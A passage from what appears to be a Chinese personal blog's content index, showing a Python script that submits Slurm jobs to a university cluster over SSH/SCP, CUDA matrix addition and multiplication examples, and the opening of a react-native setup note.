source&quot;</span>)</span><br><span class=\"line\">    scp = SCPClient(ssh.get_transport(),socket_timeout=<span class=\"number\">16</span>)</span><br><span class=\"line\">    scp.put(source_path,recursive=<span class=\"literal\">True</span>,remote_path=<span class=\"string\">f&quot;~/<span class=\"subst\">&#123;job_name&#125;</span>&quot;</span>)</span><br><span class=\"line\">    scp.put(<span class=\"string\">f&quot;./<span class=\"subst\">&#123;job_name&#125;</span>.slurm&quot;</span>,<span class=\"string\">f&quot;~/<span class=\"subst\">&#123;job_name&#125;</span>/<span class=\"subst\">&#123;job_name&#125;</span>.slurm&quot;</span>)</span><br><span class=\"line\">    scp.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">download_result</span>(<span class=\"params\">job_id</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;downloading result&quot;</span>)</span><br><span class=\"line\">    scp = SCPClient(ssh.get_transport(),socket_timeout=<span class=\"number\">16</span>)</span><br><span class=\"line\">    scp = SCPClient(ssh.get_transport(),socket_timeout=<span class=\"number\">16</span>)</span><br><span class=\"line\">    <span class=\"comment\">#scp.get(f&quot;~/result/&#123;job_id&#125;.out&quot;,f&quot;&#123;source_path&#125;/&#123;job_name&#125;.out&quot;)</span></span><br><span class=\"line\">    <span class=\"comment\">#scp.get(f&quot;~/result/&#123;job_id&#125;.err&quot;,f&quot;&#123;source_path&#125;/&#123;job_name&#125;.err&quot;)</span></span><br><span class=\"line\">    scp.get(<span class=\"string\">f&quot;~/<span class=\"subst\">&#123;job_name&#125;</span>/result&quot;</span>,recursive=<span class=\"literal\">True</span>,local_path=<span class=\"string\">f&quot;<span class=\"subst\">&#123;source_path&#125;</span>/&quot;</span>)</span><br><span class=\"line\">    scp.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">submit_job</span>():</span><br><span class=\"line\">    t = <span class=\"number\">3</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> t:</span><br><span class=\"line\">        s = ssh.invoke_shell()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;starting ssh&quot;</span>)</span><br><span class=\"line\">        sleep(<span class=\"number\">2</span>)</span><br><span class=\"line\">        recv = s.recv(NREAD).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> recv.find(<span class=\"string\">&quot;stu1648&quot;</span>) == -<span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;start ssh failed,retrying&quot;</span>)</span><br><span class=\"line\">            t -= <span class=\"number\">1</span></span><br><span class=\"line\">            sleep(<span class=\"number\">5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;start ssh success&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;sending sbatch&quot;</span>)</span><br><span class=\"line\">        s.send(<span class=\"string\">f&quot;cd ~/<span class=\"subst\">&#123;job_name&#125;</span> &amp;&amp; sbatch ./<span class=\"subst\">&#123;job_name&#125;</span>.slurm\\n&quot;</span>)</span><br><span class=\"line\">        sleep(<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        recv = s.recv(NREAD).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">        index = recv.find(job_submit_tag)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> index ==-<span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(recv)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;sbatch failed,retrying&quot;</span>)</span><br><span class=\"line\">            t -= <span class=\"number\">1</span></span><br><span class=\"line\">            sleep(<span class=\"number\">5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;sbatch success&quot;</span>)</span><br><span class=\"line\">        job_id = recv[index+<span class=\"built_in\">len</span>(job_submit_tag)+<span class=\"number\">1</span>:recv.index(line_finish_tag)-<span class=\"number\">2</span>]</span><br><span class=\"line\">        <span class=\"comment\">#job_id = 25099457</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;<span class=\"subst\">&#123;job_id=&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;start checking job status&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        check_status_cmd = <span class=\"string\">f&quot;sacct | grep <span class=\"subst\">&#123;job_id&#125;</span> | awk &#x27;&#123;&#123;print $6&#125;&#125;&#x27;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            s.send(check_status_cmd+<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">            sleep(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">            recv = s.recv(NREAD).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">            status = recv[recv.index(check_status_cmd)+<span class=\"built_in\">len</span>(check_status_cmd)+<span class=\"number\">2</span>:recv.index(line_finish_tag)-<span class=\"number\">2</span>]</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;<span class=\"subst\">&#123;status=&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> status.find(FAILED)!=-<span class=\"number\">1</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;job failed&quot;</span>)</span><br><span class=\"line\">                <span class=\"comment\">#user might need error message, still get results</span></span><br><span class=\"line\">                <span class=\"comment\">#exit(0)</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> job_id</span><br><span class=\"line\">            <span class=\"keyword\">if</span> status.find(COMPLETED)==-<span class=\"number\">1</span>:</span><br><span class=\"line\">                sleep(<span class=\"number\">10</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> job_id</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">generate_slurm()</span><br><span class=\"line\">upload_source()</span><br><span class=\"line\">job_id =  submit_job()</span><br><span class=\"line\"><span class=\"keyword\">if</span> job_id:</span><br><span class=\"line\">    download_result(job_id)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;finish&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>由于containerd目前的使用是直接把所有容器的输出定为stdout，并没有用类似nerdctl支持-d和logs。这样会把python程序的输出都直接放到屏幕上，这样也方便观察结果，可以认为是个feature。</p>\n<p>如果源数据文件比较大，scp上传需要花不少时间</p>\n<h2 id=\"CUDA程序\"><a href=\"#CUDA程序\" class=\"headerlink\" title=\"CUDA程序\"></a>CUDA程序</h2><p>交我算只适合提交自己确认正确的程序，因为几乎全是pending，完全无法动态调试。每天晚上十一点之后会稍微好一点。</p>\n<p><a href=\"https://colab.research.google.com/github/hussain0048/C-Plus-Plus/blob/master/Basic_of_C%2B%2B.ipynb\">Google Colab</a>用这个可以有cuda环境来调试</p>\n<p>由于希望支持的GPU应用是有意义的，所以需要满足两点：</p>\n<ol>\n<li>数据量大</li>\n<li>由用户自己提供输入，以文件形式获得输出</li>\n</ol>\n<p>故添加文件输入输出模块，并提前准备好测试数据。</p>\n<p>为了编译任务快速结束以便展示并且减轻交我算平台的压力，这里还是选择只使用10000*10000的矩阵</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;files.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> N 10000</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> size = (<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span>)N*N*<span class=\"keyword\">sizeof</span>(<span class=\"type\">double</span>);</span><br><span class=\"line\">  <span class=\"type\">double</span> *a = (<span class=\"type\">double</span>*)<span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">  <span class=\"type\">double</span> *b = (<span class=\"type\">double</span>*)<span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">  <span class=\"keyword\">for</span>( <span class=\"type\">int</span> row = <span class=\"number\">0</span>; row &lt; N; ++row )&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>( <span class=\"type\">int</span> col = <span class=\"number\">0</span>; col &lt; N; ++col )&#123;</span><br><span class=\"line\">      a[row*N + col] = row;</span><br><span class=\"line\">      b[row*N + col] = col+<span class=\"number\">2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  write_values_to_file(<span class=\"string\">&quot;matrix_a_data&quot;</span>,a,size);</span><br><span class=\"line\">  write_values_to_file(<span class=\"string\">&quot;matrix_b_data&quot;</span>,b,size);</span><br><span class=\"line\"></span><br><span class=\"line\">  read_values_from_file(<span class=\"string\">&quot;matrix_a_data&quot;</span>,a,size);</span><br><span class=\"line\">  read_values_from_file(<span class=\"string\">&quot;matrix_b_data&quot;</span>,b,size);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span>( <span class=\"type\">int</span> row = <span class=\"number\">0</span>; row &lt; N; ++row )&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>( <span class=\"type\">int</span> col = <span class=\"number\">0</span>; col &lt; N; ++col )&#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span>(a[row*N + col] != row ||b[row*N + col] != col+<span class=\"number\">2</span>)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;error\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;generate data success\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"矩阵加法\"><a href=\"#矩阵加法\" class=\"headerlink\" title=\"矩阵加法\"></a>矩阵加法</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;files.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CHECK_CORRECTNESS</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> N  10000</span></span><br><span class=\"line\"></span><br><span class=\"line\">__global__ <span class=\"type\">void</span> <span class=\"title function_\">matrixAddGPU</span><span class=\"params\">( <span class=\"type\">double</span> * a, <span class=\"type\">double</span> * b, <span class=\"type\">double</span> * c )</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">int</span> row_begin = blockIdx.x * blockDim.x + threadIdx.x;</span><br><span class=\"line\">  <span class=\"type\">int</span> col_begin = blockIdx.y * blockDim.y + threadIdx.y;</span><br><span class=\"line\">  <span class=\"type\">int</span> stride_row = gridDim.x * blockDim.x;</span><br><span class=\"line\">  <span class=\"type\">int</span> stride_col = gridDim.y * blockDim.y;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"type\">int</span> row = row_begin; row &lt; N ;row += stride_row) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> col= col_begin; col&lt; N ; col+= stride_col) &#123;</span><br><span class=\"line\">                c[row * N + col] = a[row*N+col] + b[row*N+col];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">matrixAddCPU</span><span class=\"params\">( <span class=\"type\">double</span> * a, <span class=\"type\">double</span> * b, <span class=\"type\">double</span> * c )</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span>( <span class=\"type\">int</span> row = <span class=\"number\">0</span>; row &lt; N; ++row )</span><br><span class=\"line\">    <span class=\"keyword\">for</span>( <span class=\"type\">int</span> col = <span class=\"number\">0</span>; col &lt; N; ++col )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      c[row * N + col] = a[row*N+col]+b[row*N+col];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        cudaError_t cudaStatus;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">int</span> deviceId;</span><br><span class=\"line\">  <span class=\"type\">int</span> numberOfSMs;</span><br><span class=\"line\"></span><br><span class=\"line\">  cudaGetDevice(&amp;deviceId);</span><br><span class=\"line\">  cudaDeviceGetAttribute(&amp;numberOfSMs, cudaDevAttrMultiProcessorCount, deviceId);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;SM:%d\\n&quot;</span>,numberOfSMs);<span class=\"comment\">//80</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">double</span> *a, *b, *c_gpu;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> size = (<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span>)N * N * <span class=\"keyword\">sizeof</span> (<span class=\"type\">double</span>); <span class=\"comment\">// Number of bytes of an N x N matrix</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Allocate memory</span></span><br><span class=\"line\">  cudaMallocManaged (&amp;a, size);</span><br><span class=\"line\">  cudaMallocManaged (&amp;b, size);</span><br><span class=\"line\">  cudaMallocManaged (&amp;c_gpu, size);</span><br><span class=\"line\">  read_values_from_file(<span class=\"string\">&quot;matrix_a_data&quot;</span>, a, size);</span><br><span class=\"line\">  read_values_from_file(<span class=\"string\">&quot;matrix_b_data&quot;</span>, b, size);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">//if too large,invalid configuration argument</span></span><br><span class=\"line\">  dim3 <span class=\"title function_\">threads_per_block</span><span class=\"params\">(<span class=\"number\">32</span>,<span class=\"number\">32</span>,<span class=\"number\">1</span>)</span>;</span><br><span class=\"line\">  dim3 <span class=\"title function_\">number_of_blocks</span> <span class=\"params\">(<span class=\"number\">16</span>*numberOfSMs,<span class=\"number\">16</span>*numberOfSMs, <span class=\"number\">1</span>)</span>;</span><br><span class=\"line\">  cudaMemPrefetchAsync(a, size, deviceId);</span><br><span class=\"line\">  cudaMemPrefetchAsync(b, size, deviceId);</span><br><span class=\"line\">  cudaMemPrefetchAsync(c_gpu, size, deviceId);</span><br><span class=\"line\">  matrixAddGPU &lt;&lt;&lt; number_of_blocks, threads_per_block &gt;&gt;&gt; ( a, b, c_gpu );</span><br><span class=\"line\">        cudaStatus = cudaGetLastError();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cudaStatus != cudaSuccess) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;call matrixAddGPU error: %s\\n&quot;</span>, cudaGetErrorString(cudaStatus));</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  cudaDeviceSynchronize(); <span class=\"comment\">// Wait for the GPU to finish before proceeding</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Call the CPU version to check our work</span></span><br><span class=\"line\">    <span class=\"comment\">// Compare the two answers to make sure they are equal</span></span><br><span class=\"line\">  <span class=\"type\">bool</span> error = <span class=\"literal\">false</span>;</span><br><span class=\"line\">  <span class=\"meta\">#<span class=\"keyword\">ifdef</span> CHECK_CORRECTNESS</span></span><br><span class=\"line\">    <span class=\"type\">double</span> *c_cpu;</span><br><span class=\"line\">    cudaMallocManaged (&amp;c_cpu, size);</span><br><span class=\"line\">    matrixAddCPU( a, b, c_cpu );</span><br><span class=\"line\">    <span class=\"keyword\">for</span>( <span class=\"type\">int</span> row = <span class=\"number\">0</span>; row &lt; N &amp;&amp; !error; ++row )</span><br><span class=\"line\">      <span class=\"keyword\">for</span>( <span class=\"type\">int</span> col = <span class=\"number\">0</span>; col &lt; N &amp;&amp; !error; ++col )</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (c_cpu[row * N + col] != c_gpu[row * N + col])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;FOUND ERROR at c[%d][%d]\\n&quot;</span>, row, col);</span><br><span class=\"line\">          error = <span class=\"literal\">true</span>;</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    cudaFree( c_cpu );</span><br><span class=\"line\">  <span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!error)</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Success!\\n&quot;</span>);</span><br><span class=\"line\">  write_values_to_file(<span class=\"string\">&quot;result/matrix_c_data&quot;</span>, c_gpu, size);</span><br><span class=\"line\">  <span class=\"comment\">// Free all our allocated memory</span></span><br><span class=\"line\">  cudaFree(a);</span><br><span class=\"line\">  cudaFree(b);</span><br><span class=\"line\">  cudaFree( c_gpu );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"矩阵乘法\"><a href=\"#矩阵乘法\" class=\"headerlink\" title=\"矩阵乘法\"></a>矩阵乘法</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;files.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CHECK_CORRECTNESS</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> N  10000</span></span><br><span class=\"line\"></span><br><span class=\"line\">__global__ <span class=\"type\">void</span> <span class=\"title function_\">matrixMulGPU</span><span class=\"params\">( <span class=\"type\">double</span> * a, <span class=\"type\">double</span> * b, <span class=\"type\">double</span> * c )</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">int</span> row_begin = blockIdx.x * blockDim.x + threadIdx.x;</span><br><span class=\"line\">  <span class=\"type\">int</span> col_begin = blockIdx.y * blockDim.y + threadIdx.y;</span><br><span class=\"line\">  <span class=\"type\">int</span> stride_row = gridDim.x * blockDim.x;</span><br><span class=\"line\">  <span class=\"type\">int</span> stride_col = gridDim.y * blockDim.y;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"type\">int</span> row = row_begin; row &lt; N ;row += stride_row) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> col= col_begin; col&lt; N ; col+= stride_col) &#123;</span><br><span class=\"line\">                <span class=\"type\">double</span> val = <span class=\"number\">0</span>;</span><br><span class=\"line\">                <span class=\"keyword\">for</span>(<span class=\"type\">int</span> k = <span class=\"number\">0</span>; k &lt; N; ++k )&#123;</span><br><span class=\"line\">                        val += a[row * N + k] * b[k * N + col];</span><br><span class=\"line\">                        c[row * N + col] = val;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">matrixMulCPU</span><span class=\"params\">( <span class=\"type\">double</span> * a, <span class=\"type\">double</span> * b, <span class=\"type\">double</span> * c )</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span>( <span class=\"type\">int</span> row = <span class=\"number\">0</span>; row &lt; N; ++row )</span><br><span class=\"line\">    <span class=\"keyword\">for</span>( <span class=\"type\">int</span> col = <span class=\"number\">0</span>; col &lt; N; ++col )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"type\">double</span> val = <span class=\"number\">0</span>;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> ( <span class=\"type\">int</span> k = <span class=\"number\">0</span>; k &lt; N; ++k )</span><br><span class=\"line\">        val += a[row * N + k] * b[k * N + col];</span><br><span class=\"line\">      c[row * N + col] = val;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        cudaError_t cudaStatus;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">int</span> deviceId;</span><br><span class=\"line\">  <span class=\"type\">int</span> numberOfSMs;</span><br><span class=\"line\"></span><br><span class=\"line\">  cudaGetDevice(&amp;deviceId);</span><br><span class=\"line\">  cudaDeviceGetAttribute(&amp;numberOfSMs, cudaDevAttrMultiProcessorCount, deviceId);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;SM:%d\\n&quot;</span>,numberOfSMs);<span class=\"comment\">//80</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">double</span> *a, *b, *c_gpu;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> size = (<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span>)N * N * <span class=\"keyword\">sizeof</span> (<span class=\"type\">double</span>); <span class=\"comment\">// Number of bytes of an N x N matrix</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Allocate memory</span></span><br><span class=\"line\">  cudaMallocManaged (&amp;a, size);</span><br><span class=\"line\">  cudaMallocManaged (&amp;b, size);</span><br><span class=\"line\">  cudaMallocManaged (&amp;c_gpu, size);</span><br><span class=\"line\">  read_values_from_file(<span class=\"string\">&quot;matrix_a_data&quot;</span>, a, size);</span><br><span class=\"line\">  read_values_from_file(<span class=\"string\">&quot;matrix_b_data&quot;</span>, b, size);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">//if too large,invalid configuration argument</span></span><br><span class=\"line\">  dim3 <span class=\"title function_\">threads_per_block</span><span class=\"params\">(<span class=\"number\">32</span>,<span class=\"number\">32</span>,<span class=\"number\">1</span>)</span>;</span><br><span class=\"line\">  dim3 <span class=\"title function_\">number_of_blocks</span> <span class=\"params\">(<span class=\"number\">16</span>*numberOfSMs,<span class=\"number\">16</span>*numberOfSMs, <span class=\"number\">1</span>)</span>;</span><br><span class=\"line\">  cudaMemPrefetchAsync(a, size, deviceId);</span><br><span class=\"line\">  cudaMemPrefetchAsync(b, size, deviceId);</span><br><span class=\"line\">  cudaMemPrefetchAsync(c_gpu, size, deviceId);</span><br><span class=\"line\">  matrixMulGPU &lt;&lt;&lt; number_of_blocks, threads_per_block &gt;&gt;&gt; ( a, b, c_gpu );</span><br><span class=\"line\">        cudaStatus = cudaGetLastError();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cudaStatus != cudaSuccess) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;call matrixAddGPU error: %s\\n&quot;</span>, cudaGetErrorString(cudaStatus));</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  cudaDeviceSynchronize(); <span class=\"comment\">// Wait for the GPU to finish before proceeding</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Call the CPU version to check our work</span></span><br><span class=\"line\">    <span class=\"comment\">// Compare the two answers to make sure they are equal</span></span><br><span class=\"line\">  <span class=\"type\">bool</span> error = <span class=\"literal\">false</span>;</span><br><span class=\"line\">  <span class=\"meta\">#<span class=\"keyword\">ifdef</span> CHECK_CORRECTNESS</span></span><br><span class=\"line\">    <span class=\"type\">double</span> *c_cpu;</span><br><span class=\"line\">    cudaMallocManaged (&amp;c_cpu, size);</span><br><span class=\"line\">    matrixMulCPU( a, b, c_cpu );</span><br><span class=\"line\">    <span class=\"keyword\">for</span>( <span class=\"type\">int</span> row = <span class=\"number\">0</span>; row &lt; N &amp;&amp; !error; ++row )</span><br><span class=\"line\">      <span class=\"keyword\">for</span>( <span class=\"type\">int</span> col = <span class=\"number\">0</span>; col &lt; N &amp;&amp; !error; ++col )</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (c_cpu[row * N + col] != c_gpu[row * N + col])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;FOUND ERROR at c[%d][%d]\\n&quot;</span>, row, col);</span><br><span class=\"line\">          error = <span class=\"literal\">true</span>;</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    cudaFree( c_cpu );</span><br><span class=\"line\">  <span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!error)</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Success!\\n&quot;</span>);</span><br><span class=\"line\">  write_values_to_file(<span class=\"string\">&quot;result/matrix_c_data&quot;</span>, c_gpu, size);</span><br><span class=\"line\">  <span class=\"comment\">// Free all our allocated memory</span></span><br><span class=\"line\">  cudaFree(a);</span><br><span class=\"line\">  cudaFree(b);</span><br><span class=\"line\">  cudaFree( c_gpu );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"编译\"><a href=\"#编译\" class=\"headerlink\" title=\"编译\"></a>编译</h3><figure class=\"highlight makefile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">build:</span></span><br><span class=\"line\">        nvcc -o matrix-mul matrix-mul.cu -I .</span><br><span class=\"line\"><span class=\"section\">run:</span></span><br><span class=\"line\">        ./matrix-mul</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>-I 表示在当前目录寻找include的头文件</p>\n","categories":["misc"]},{"title":"react-native 开发记录","url":"/2024/09/17/misc/react-native-note/","content":"<h1 id=\"react-native-开发记录\"><a href=\"#react-native-开发记录\" class=\"headerlink\" title=\"react-native 开发记录\"></a>react-native 开发记录</h1><h2 id=\"react-native-项目配置\"><a href=\"#react-native-项目配置\" class=\"headerlink\" title=\"react-native 项目配置\"></a>react-native 项目配置</h2><ul>\n<li><p>最新版0.68 要求jdk11 互联网课装好的是jdk8 所以使用0.66.4</p>\n<p>用intellij自动生成是最新版的，降级：</p>\n</li>\n</ul>\n<p><code>npm install --save react-native@0.66.4</code></p>\n<ul>\n<li><p>用intellij自动生成的 跑不了 会报少文件 用官网说的命令行方式新建项目<code>npx react-native init Project --version 0.66.4</code></p>\n<p>然而用命令行新建的项目再用intellij打开并不能识别 所以用vscode</p>\n</li>\n<li><p>安卓模拟器配置：<a href=\"https://reactnative.dev/docs/environment-setup\">https://reactnative.dev/docs/environment-setup</a></p>\n</li>\n<li><p>编译运行：<code>npx react-native run-android</code> (用vscode可以终端-运行任务)</p>\n</li>\n<li><p>打包发给手机：(android目录下)<code>gradlew assembleRelease</code></p>\n<p>apk路径：Project\\android\\app\\build\\outputs\\apk\\release</p>\n</li>\n<li><p>ios不像安卓这么容易，必须用Xcode，而Xcode又必须是mac环境</p>\n</li>\n</ul>\n<h2 id=\"package\"><a href=\"#package\" class=\"headerlink\" title=\"package\"></a>package</h2><p>包有互相依赖关系<br><code>npm install --legacy-peer-deps</code> 避免报错</p>\n<h3 id=\"导航\"><a href=\"#导航\" class=\"headerlink\" title=\"导航\"></a>导航</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;@react-navigation/native&quot;: 